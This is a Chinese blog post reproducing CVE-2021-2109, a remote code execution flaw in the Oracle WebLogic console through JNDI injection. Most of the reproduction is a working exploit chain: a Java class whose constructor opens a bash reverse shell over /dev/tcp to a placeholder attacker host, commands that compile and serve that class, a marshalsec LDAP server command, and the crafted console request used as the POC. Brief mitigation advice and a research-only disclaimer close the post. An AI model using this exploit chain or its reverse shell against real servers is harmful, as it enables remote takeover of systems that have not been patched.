> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/nTfnRlAbAa7WjLsCBRx30g)

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeibibIJvqKW4nkKv5xCWqHhIjOnOn2wogzjuUVTGFfszFyxBB1asTYiaAp70PuC1sqeBDIS29MBooZA/640?wx_fmt=jpeg)

  
CVE-2021-2109 Weblogic 远程代码执行

一、漏洞简介  

Oracle 官方发布了漏洞补丁，修了包括 CVE-2021-2109 Weblogic Server 远程代码执行漏洞在内的多个高危严重漏洞。CVE-2021-2109 中，攻击者可构造恶意请求，造成 JNDI 注入，执行任意代码，从而控制服务器。

二、影响版本

WebLogic 10.3.6.0.0

WebLogic 12.1.3.0.0

WebLogic 12.2.1.3.0

WebLogic 12.2.1.4.0

WebLogic 14.1.1.0.0

三、漏洞复现

环境准备：WebLogic 10.3.6.0.0（win）

登陆后台：

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdut5vVxj12TwJRas5ibek7icVZiaSGMPIk1IWoxdGKwvRztOcYkpybE3vpWwt2cwy3ibYarv9hPJE8fQ/640?wx_fmt=png)

http://192.168.1.111:7001/console/login/LoginForm.jsp  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdut5vVxj12TwJRas5ibek7ictFfUMuU55ibUjR6rwKfQyVkmZoDystDbAwGhtDJdbDYlKIgyMoB2CyQ/640?wx_fmt=png)

启动 Ldap 服务：  

具体方法参考以前的 fastjson 方式：

[Fastjson1.2.47 反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzIyNjk0ODYxMA==&mid=2247484025&idx=1&sn=10e26bbfd67f82b4c457601699d1f8eb&chksm=e869e114df1e6802491b516b03121304b35565bffe8ed8242214743b842897bd3e84673ba1e6&scene=21#wechat_redirect)  

具体地址：https://mp.weixin.qq.com/s/69NCDDSaa07YY7DwyC9fgA

将下面 exp 保存为 Exploit.java 文件

```
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class Exploit{
    public Exploit() throws Exception {
        //Process p = Runtime.getRuntime().exec(new String[]{"cmd","/c","calc.exe"});
      Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/XXXXXX/34567;cat <&5 | while read line; do $line 2>&5 >&5; done"});
        InputStream is = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));

        String line;
        while((line = reader.readLine()) != null) {
            System.out.println(line);
        }

        p.waitFor();
        is.close();
        reader.close();
        p.destroy();
    }

    public static void main(String[] args) throws Exception {
    }
}
```

```
javac Exploit.java  编译生成Exploit.class文件
```

python 启动 web 服务

```
python -m SimpleHTTPServer  1111
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKVs2yfMaKSyVFPI9DcnafoSPTwPicXDLXbUAicQjial0fTTbBEENOw9k4FQ/640?wx_fmt=png)

通过 python 启动 exphttp 服务启动 ldap 服务 (RMI 服务)

本次复现使用 ldap 服务，同时也将 RMI 对应的操作也做了截图整理，主要是的原因的 RMI 的 JDk 版本支持，LDAPJava 的版本本环境的支持（注意 JDK 的版本，这个是可能成功与否的关键）。

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.LDAPRefServer  http://XX.XX.XX.XX:1111/\#Exploit 999
```

ldap 抓包访问修改数据包

```
GET /console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.1;100:389/exp;AdminServer%22) HTTP/1.1
Host: 192.168.1.111:7001
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.111:7001/console/login/LoginForm.jsp
Connection: close
Cookie: ADMINCONSOLESESSION=UXojCN1Oo-FkguAuuU35Z6tZ2-zmMUTskIjOizb35HOEcL6AwZCl!-2080081994; JSESSIONID=sKsgWcOgre9zQdntt3QYv14IleXkZ94jW9vYYt4fEIOdNBaQtBeV!-1871779164
Upgrade-Insecure-Requests: 1
```

POC:

```
GET /console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.1;100:389/exp;AdminServer%22) HTTP/1.1
```

执行成功效果  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdut5vVxj12TwJRas5ibek7icO98gYH6ELxM8DsnfXeAB2CbRPH3aoFxmIgUZKHribaBttG7WCYBWRWQ/640?wx_fmt=png)

具体的演示 demo 视频：  

四、安全建议

1、禁用 T3 协议

如果您不依赖 T3 协议进行 JVM 通信，可通过暂时阻断 T3 协议缓解此漏洞带来的影响

1). 进入 Weblogic 控制台，在 base_domain 配置页面中，进入 “安全” 选项卡页面，点击“筛选器”，配置筛选器。

2). 在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，在连接筛选器规则框中输入：* * 7001 deny t3 t3s。

2、禁止启用 IIOP

登陆 Weblogic 控制台，找到启用 IIOP 选项，取消勾选，重启生效

3、临时关闭后台 / console/console.portal 对外访问

4、升级官方安全补丁

参考：

https://xz.aliyun.com/t/9049

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人 CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF 主页：https://www.freebuf.com/author/thelostworld?type=article

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)

欢迎添加本公众号作者微信交流，添加时备注一下 “公众号”  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3ibf9GUyuOCzpVJBq6z1Z60vzBjlEWLAu4gD9Lk4S57BcEiaGOibJfoXicQ/640?wx_fmt=png)